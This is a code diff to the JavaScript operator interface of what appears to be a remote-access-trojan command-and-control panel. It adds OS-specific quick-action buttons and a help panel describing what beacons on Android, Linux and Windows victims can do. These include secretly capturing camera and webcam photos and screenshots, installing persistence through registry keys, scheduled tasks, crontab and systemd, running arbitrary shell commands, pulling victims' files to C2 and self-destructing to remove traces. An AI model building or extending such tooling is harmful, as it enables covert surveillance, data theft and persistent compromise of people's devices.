@@ -186,6 +186,8 @@ async function selB(uuid) {
     const nm = be ? es(be.nickname || be.hostname || '') : '';
     document.getElementById('th-n').textContent = nm || uuid.substring(0, 8);
     document.getElementById('nt-in').value = (be && be.notes) || '';
+    // OS-based button switching
+    updateOSButtons(be ? (be.os_family || 'unknown') : 'unknown');
     const [th] = await Promise.all([
         ApiClient.get('terminal', { beacon_uuid: uuid }),
         loadInfo(uuid),
@@ -304,8 +306,128 @@ function helpToggle() {
     const card = document.getElementById('help-card');
     if (!card) return;
     card.style.display = card.style.display === 'none' ? 'block' : 'none';
-    if (card.style.display === 'block') card.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+    if (card.style.display === 'block') {
+        renderHelp();
+        card.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+    }
 }
+
+const _osNames = { windows: 'Windows', linux: 'Linux', android: 'Android', macos: 'macOS', unknown: 'Unknown' };
+const _osBadge = { windows: 'os-win', linux: 'os-linux', android: 'os-andr', macos: 'os-mac', unknown: '' };
+
+function updateOSButtons(os) {
+    const osKey = (os || 'unknown').toLowerCase();
+    _lastOS = osKey;
+    // Update badge in QA header
+    const badge = document.getElementById('qa-os');
+    if (badge) badge.innerHTML = '<span class="os-badge ' + (_osBadge[osKey] || '') + '">' + (_osNames[osKey] || osKey) + '</span>';
+    // Show/hide buttons
+    document.querySelectorAll('.qa-btn').forEach(btn => {
+        const isAll = btn.classList.contains('qa-all');
+        const isOs = btn.classList.contains('qa-' + osKey);
+        btn.style.display = (isAll || isOs) ? '' : 'none';
+    });
+}
+
+function renderHelp() {
+    const osKey = (_lastOS || 'unknown').toLowerCase();
+    const h = document.getElementById('help-body');
+    const osBadge = document.getElementById('help-os');
+    if (osBadge) osBadge.innerHTML = '<span class="os-badge ' + (_osBadge[osKey] || '') + '">' + (_osNames[osKey] || osKey) + '</span>';
+
+    let html = '<div style="color:var(--cyan);font-weight:600;margin-bottom:6px">QUICK ACTIONS</div>';
+    html += '<table style="width:100%;border-collapse:collapse">';
+
+    if (osKey === 'android') {
+        html += helpRow('&#128248; cam back', 'Capture photo with back camera. Saved to Device Files.');
+        html += helpRow('&#128248; cam front', 'Capture photo with front camera. Saved to Device Files.');
+        html += helpRow('&#128247; ss / screenshot', 'Capture device screen via MediaProjection. Saved to Device Files.');
+        html += helpRow('persist', 'Battery optimization exemption + foreground service + boot receiver.');
+        html += helpRow('&#11015; dl', 'Download file from C2 to target (push).');
+        html += helpRow('&#9760; kill', 'Kill beacon service. Will restart on boot.');
+        html += helpRow('&#128128; self-destruct', 'Clean all data, delete UUID, show uninstall prompt.');
+    } else if (osKey === 'linux') {
+        html += helpRow('&#128247; screenshot', 'Capture screen via scrot/import. Saved to Device Files.');
+        html += helpRow('persist', 'Install crontab + systemd + .bashrc persistence.');
+        html += helpRow('&#11015; dl', 'Download file from C2 to target (push).');
+        html += helpRow('&#9760; kill', 'Kill beacon process. Will respawn on reboot if persisted.');
+        html += helpRow('&#128128; self-destruct', 'Remove all persistence, delete UUID file, kill process.');
+    } else if (osKey === 'windows') {
+        html += helpRow('&#128247; screenshot', 'Capture full screen (DPI-aware, multi-monitor). Saved to Device Files.');
+        html += helpRow('&#128248; cam', 'Capture webcam photo (VFW). Saved to Device Files.');
+        html += helpRow('persist', 'Registry Run key + Startup .vbs + Scheduled Task + copied exe.');
+        html += helpRow('&#11015; dl', 'Download file from C2 to target (push).');
+        html += helpRow('&#9760; kill', 'Kill beacon process. Will respawn on reboot if persisted.');
+        html += helpRow('&#128128; self-destruct', 'Remove ALL persistence (registry, tasks, VBS, exe), delete UUID, kill.');
+    } else {
+        html += helpRow('&#128247; screenshot', 'Capture screen (if supported).');
+        html += helpRow('persist', 'Install persistence (if supported).');
+        html += helpRow('&#11015; dl', 'Download file from C2 to target.');
+        html += helpRow('&#9760; kill', 'Kill beacon process.');
+    }
+    html += '<tr><td style="padding:2px 8px;color:var(--green);white-space:nowrap">&#128193; FM</td><td>File Manager: browse drives, directories, preview files, upload/download, delete.</td></tr>';
+    html += '<tr><td style="padding:2px 8px;color:var(--green);white-space:nowrap">&#128451; DF</td><td>Device Files: view screenshots, camera shots, pulled files, notes.</td></tr>';
+    html += '</table>';
+
+    html += '<div style="color:var(--cyan);font-weight:600;margin:10px 0 6px">TERMINAL COMMANDS</div>';
+    html += '<table style="width:100%;border-collapse:collapse">';
+    if (osKey === 'android') {
+        html += helpRow('shell &lt;cmd&gt;', 'Run any shell command via sh -c.');
+        html += helpRow('cam back / cam front', 'Capture photo (back or front camera).');
+        html += helpRow('ss', 'Capture screenshot via MediaProjection.');
+        html += helpRow('ps', 'List running processes from /proc.');
+        html += helpRow('drives', 'List storage mounts (/sdcard, /, /data, /system).');
+        html += helpRow('browse &lt;path&gt;', 'List directory. Default: /sdcard.');
+        html += helpRow('pull &lt;path&gt;', 'Upload file from device to C2.');
+        html += helpRow('push &lt;file_id&gt; &lt;path&gt;', 'Download file from C2 to device.');
+        html += helpRow('read &lt;path&gt;', 'Read file (text or base64 for binary, max 10MB).');
+        html += helpRow('delete &lt;path&gt;', 'Delete file or directory.');
+        html += helpRow('die / killself', 'Kill beacon service instantly.');
+        html += helpRow('selfdestruct', 'Clean data + show uninstall prompt.');
+    } else if (osKey === 'windows') {
+        html += helpRow('shell &lt;cmd&gt;', 'Run any Windows command via cmd.exe.');
+        html += helpRow('ps', 'List running processes (tasklist /v).');
+        html += helpRow('kill &lt;pid&gt;', 'Kill a process by PID (taskkill /PID /F).');
+        html += helpRow('drives', 'List all disk partitions with type and size.');
+        html += helpRow('browse &lt;path&gt;', 'List directory contents. Use /C:/path format.');
+        html += helpRow('pull &lt;path&gt;', 'Upload file from target to C2. Use /C:/path format.');
+        html += helpRow('push &lt;file_id&gt; &lt;path&gt;', 'Download file from C2 to target.');
+        html += helpRow('read &lt;path&gt;', 'Read file (text or base64 for binary, max 10MB).');
+        html += helpRow('delete &lt;path&gt;', 'Delete file or directory.');
+        html += helpRow('screenshot', 'Capture screen (same as button).');
+        html += helpRow('camera / cam', 'Capture webcam (same as button).');
+        html += helpRow('die / killself', 'Kill beacon process instantly (no cleanup).');
+    } else {
+        html += helpRow('shell &lt;cmd&gt;', 'Run any shell command.');
+        html += helpRow('ps', 'List running processes.');
+        html += helpRow('drives', 'List disk partitions/mounts.');
+        html += helpRow('browse &lt;path&gt;', 'List directory contents.');
+        html += helpRow('pull &lt;path&gt;', 'Upload file from target to C2.');
+        html += helpRow('push &lt;file_id&gt; &lt;path&gt;', 'Download file from C2 to target.');
+        html += helpRow('read &lt;path&gt;', 'Read file (text or base64 for binary).');
+        html += helpRow('delete &lt;path&gt;', 'Delete file or directory.');
+        html += helpRow('die / killself', 'Kill beacon process.');
+    }
+    html += '</table>';
+
+    html += '<div style="color:var(--cyan);font-weight:600;margin:10px 0 6px">FILE MANAGER</div>';
+    html += '<div style="padding:0 8px"><b>Root /</b> shows all drives. Click a drive to browse.<br>';
+    html += '<b>&#128193; Get Selected</b> pulls checked files to C2.<br>';
+    html += '<b>Push to Target</b> picks a file from C2 and sends it to target.<br>';
+    html += '<b>Info</b> shows file details. <b>Del</b> deletes (with confirmation).</div>';
+
+    html += '<div style="color:var(--cyan);font-weight:600;margin:10px 0 6px">DEVICE FILES (DF)</div>';
+    html += '<div style="padding:0 8px">Shows all files pulled from the target, screenshots, and camera shots.<br>';
+    html += '<b>Open</b> a folder. <b>View</b> images inline. <b>DL</b> downloads to your machine.</div>';
+
+    h.innerHTML = html;
+}
+
+function helpRow(cmd, desc) {
+    return '<tr><td style="padding:2px 8px;color:var(--amber);white-space:nowrap">' + cmd + '</td><td>' + desc + '</td></tr>';
+}
+
+let _lastOS = 'unknown';
 
 function fmToggle() {
     const card = document.getElementById('fm-card');
